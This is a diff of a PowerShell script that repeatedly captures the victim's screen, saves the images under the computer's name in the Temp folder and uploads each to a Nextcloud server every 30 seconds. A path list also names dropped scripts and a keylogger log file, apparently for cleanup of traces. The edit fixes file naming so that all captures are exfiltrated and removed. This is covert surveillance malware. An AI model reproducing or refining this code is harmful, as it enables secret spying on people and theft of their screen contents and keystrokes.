@@ -82,19 +82,19 @@ while($i -lt 200){
 
   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
 
-  $bmp.Save("$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture1-$i.png")
+  $bmp.Save("$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-$i.png")
   $graphics.Dispose()
   $bmp.Dispose()
   
   $i++
   <#start-sleep -Seconds 15#>
   start-sleep -Seconds 30
- "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture1.png" | Nextcloud-Upload
+ "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-$i.png" | Nextcloud-Upload
 }
 
 
 
-$paths =  "$env:APPDATA\c.ps1", "$env:APPDATA\sg.ps1", "$env:APPDATA\sg2.ps1", "C:\Users\Irene\Desktop\OMG\testing\temp.txt", "$env:temp\keylogger.txt", "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture1.png"
+$paths =  "$env:APPDATA\c.ps1", "$env:APPDATA\sg.ps1", "$env:APPDATA\sg2.ps1", "C:\Users\Irene\Desktop\OMG\testing\temp.txt", "$env:temp\keylogger.txt", "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-*.png"
 foreach($filePath in $paths) {
 	
     if (Test-Path $filePath) {
